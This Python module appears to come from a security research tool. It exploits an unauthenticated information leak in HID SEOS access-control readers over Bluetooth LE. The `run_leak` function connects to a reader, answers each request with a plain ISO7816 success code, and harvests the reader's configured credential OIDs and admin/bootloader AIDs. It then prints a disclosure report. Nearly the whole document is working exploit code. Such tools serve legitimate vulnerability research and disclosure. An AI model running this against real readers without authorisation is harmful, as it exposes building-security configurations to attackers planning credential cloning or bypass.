"""The unauthenticated config leak: a reader offers its configured SEOS PACS
credential OIDs (and cycles through admin/bootloader AIDs) to ANY BLE central
that connects and speaks basic ISO7816 status words back -- no authentication.

`collect()` drives the reader's own discovery loop (see emulate.py) to
completion, collecting every distinct OID and named AID it offers, then
`report()` renders that into a human-readable summary plus a JSON-serialisable
structure suitable for saving/diffing across readers or over time.
"""
import time
from . import oid, oid_db, emulate, framing


def parse_select_adf(apdu: bytes):
    """CLA INS(A5) P1 P2 Lc [ 06 len OID ]* -> list of dotted OIDs."""
    if len(apdu) < 5 or apdu[1] != 0xA5:
        return []
    lc = apdu[4]
    data = apdu[5:5 + lc]
    out, i = [], 0
    while i + 1 < len(data):
        tag, ln = data[i], data[i + 1]
        val = data[i + 2:i + 2 + ln]
        if tag == 0x06 and len(val) == ln:
            d = oid.try_decode(val)
            if d:
                out.append(d)
        i += 2 + ln
    return out


def parse_select_aid(apdu: bytes):
    """CLA INS(A4) P1 P2 Lc AID -> aid bytes, or None."""
    if len(apdu) < 5 or apdu[1] != 0xA4:
        return None
    lc = apdu[4]
    return apdu[5:5 + lc]


class LeakCollector:
    def __init__(self):
        self.oids_seen = []     # in first-seen order
        self.aids_seen = []     # (name, bytes) in first-seen order
        self.rounds = []        # raw transcript: list of dicts
        self.final_status = None

    def _note_oid(self, d):
        if d not in self.oids_seen:
            self.oids_seen.append(d)

    def _note_aid(self, name, val):
        if not any(v == val for _, v in self.aids_seen):
            self.aids_seen.append((name, val))

    def feed(self, apdu: bytes):
        """Feed one reassembled reader->phone APDU; returns the reply to send."""
        for d in parse_select_adf(apdu):
            self._note_oid(d)
        aid = parse_select_aid(apdu)
        if aid:
            self._note_aid(emulate.classify_aid(aid), aid)
        self.rounds.append({"apdu": apdu.hex()})
        return bytes.fromhex("9000")

    def note_status(self, status_byte: int, status_name: str):
        self.final_status = status_name
        self.rounds.append({"status": status_name, "byte": status_byte})

    def report(self) -> dict:
        return {
            "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "oids": [dict(raw=d, **{k: v for k, v in oid_db.describe(d).items() if k != "oid"})
                     for d in self.oids_seen],
            "aids": [{"name": name, "hex": val.hex()} for name, val in self.aids_seen],
            "final_status": self.final_status,
            "round_count": len(self.rounds),
            "transcript": self.rounds,
        }

    # Plain-language gloss for the raw firmware status codes.
    STATUS_GLOSS = {
        "SUCCESS": "accepted",
        "SAM_REJECTED": "rejected (no matching credential presented)",
        "ANTIPASSBACK": "rejected (anti-passback)",
        "CON_TIMEOUT": "timed out (connection)",
        "FRAG_TIMEOUT": "timed out (incomplete data)",
        "MSG_TIMEOUT": "timed out (no reply in time)",
        "LEN_ERROR": "rejected (length error)",
        "DFU_ERROR": "firmware-update error",
        "FLASH_ERROR": "flash error",
        "CONFIG_FORBIDDEN": "rejected (configuration access forbidden)",
    }

    def render_text(self, verbose: bool = False) -> str:
        """Concise, plain-language report by default; pass verbose=True for the
        full technical detail (raw OIDs, AID hex, per-round transcript)."""
        from . import oid_db
        r = self.report()
        summary = oid_db.summarize(self.oids_seen)
        status = r["final_status"]
        gloss = self.STATUS_GLOSS.get(status, status)
        lines = ["HID Reader — Configuration Disclosure (no authentication used)", ""]

        total = summary["standard_count"] + summary["custom_count"]
        if total:
            lines.append(f"Credential profiles configured on this reader: {total}")
            if summary["standard"]:
                lines.append(f"  - {len(summary['standard'])} standard HID default")
            if summary["custom"]:
                lines.append(f"  - {len(summary['custom'])} non-standard / customer-specific:")
                for c in summary["custom"]:
                    lines.append(f"      • {c}")
        else:
            lines.append("Credential profiles configured on this reader: none observed this run")

        admin_aids = [a for a in self.aids_seen if "ADMIN" in a[0] or "OPERATION_SELECTOR" in a[0]]
        lines.append("")
        lines.append(f"Admin/management mode present: {'yes' if admin_aids else 'not observed'}"
                      + (f" ({', '.join(n for n, _ in admin_aids)})" if admin_aids else ""))
        lines.append(f"Result: {gloss}")
        lines.append("")
        lines.append("(No credentials, keys, or invite codes were used — this reader answers this")
        lines.append(" much to any BLE connection that replies with a plain ISO7816 success code.)")

        if verbose:
            lines.append("")
            lines.append("-" * 72)
            lines.append(f"VERBOSE: generated {r['generated_at']}, {r['round_count']} round(s) observed")
            lines.append("")
            lines.append(f"Raw OIDs offered ({len(r['oids'])}):")
            for o in r["oids"]:
                lines.append(f"  - {o['raw']}  [{o['kind']}]")
                lines.append(f"      {o['description']}")
            lines.append("")
            lines.append(f"Raw AIDs tried ({len(r['aids'])}):")
            for a in r["aids"]:
                lines.append(f"  - {a['name']:30} {a['hex']}")
            lines.append("")
            lines.append("Round-by-round transcript:")
            for i, rd in enumerate(r["transcript"]):
                lines.append(f"  [{i}] {rd}")
        else:
            lines.append("")
            lines.append("(run with --verbose for raw OIDs/AIDs and the full protocol transcript)")
        return "\n".join(lines)


async def run_leak(mac: str, cooldown: float = 0.0, rounds: int = 10, timeout: float = 3.0):
    """Connect to `mac`, drive the discovery loop, return a LeakCollector."""
    import asyncio
    from bleak import BleakClient
    from . import DATA_CHAR_UUID, seos

    if cooldown:
        await asyncio.sleep(cooldown)

    collector = LeakCollector()
    rx, ev = [], asyncio.Event()

    def on_notify(_, data):
        rx.append(bytes(data)); ev.set()

    async def drain(t=timeout):
        try:
            await asyncio.wait_for(ev.wait(), timeout=t)
        except asyncio.TimeoutError:
            pass
        await asyncio.sleep(0.5)
        frames = list(rx); rx.clear(); ev.clear()
        return frames

    c = BleakClient(mac)
    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, on_notify)

    got = await drain(3.5)  # spontaneous frames
    buf = framing.ble_reassemble(got)
    if buf:
        collector.feed(buf)
    eot = next((f for f in got if (f[0] & 0xE0) == 0xE0), None)
    if eot:
        collector.note_status(eot[1], seos.EOT_STATUS.get(eot[1], eot[1]))

    for _ in range(rounds):
        if not c.is_connected:
            break
        reply = bytes.fromhex("9000")
        for fr in framing.ble_fragment(reply):
            await c.write_gatt_char(DATA_CHAR_UUID, fr, response=False)
            await asyncio.sleep(0.05)
        got = await drain()
        if not got:
            break
        eot = next((f for f in got if (f[0] & 0xE0) == 0xE0), None)
        if eot:
            collector.note_status(eot[1], seos.EOT_STATUS.get(eot[1], eot[1]))
            break
        buf = framing.ble_reassemble(got)
        if buf:
            collector.feed(buf)

    try:
        await c.disconnect()
    except Exception:
        pass
    return collector
